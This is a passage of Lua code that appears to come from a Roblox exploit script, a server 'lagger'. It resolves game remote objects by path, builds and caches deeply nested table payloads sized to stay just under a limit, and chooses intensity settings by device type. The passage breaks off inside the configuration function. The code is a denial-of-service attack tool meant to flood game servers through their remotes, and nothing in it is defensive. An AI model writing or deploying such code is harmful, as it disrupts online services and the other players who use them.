    local function resolveRemote(path)
        if not path or path == "" then return nil end
        local obj = game
        local cleaned = path:gsub("^game%.", "")
        for segment in cleaned:gmatch("[^%.]+") do
            if obj then obj = obj[segment] else return nil end
        end
        return obj
    end

    local isMobile2 = UIS.TouchEnabled and not UIS.KeyboardEnabled

    local function buildPayload(depth, maxCopies)
        local main, spam = {}, {{}}
        local z = spam[1]
        for i = 1, depth do local t = {}; table.insert(z, t); z = t end
        local maximum = math.min(maxCopies or 600, math.floor(499999 / (depth + 2)))
        for i = 1, maximum do
            table.insert(main, spam)
        end
        return main
    end

    local payloadCache = nil
    local payloadDepth = nil
    local payloadCopies = nil
    local function getPayload(depth, copies)
        if payloadCache and payloadDepth == depth and payloadCopies == copies then return payloadCache end
        payloadDepth = depth
        payloadCopies = copies
        payloadCache = buildPayload(depth, copies)
        return payloadCache
    end

    local function getLaggerConfig(intensity)
        if isMobile2 then
            if intensity <= 3 then return {depth=220, copies=300, wait=0.50}
            elseif intensity <= 6 then return {depth=250, copies=400, wait=0.35}
            elseif intensity <= 9 then return {depth=280, copies=500, wait=0.22}
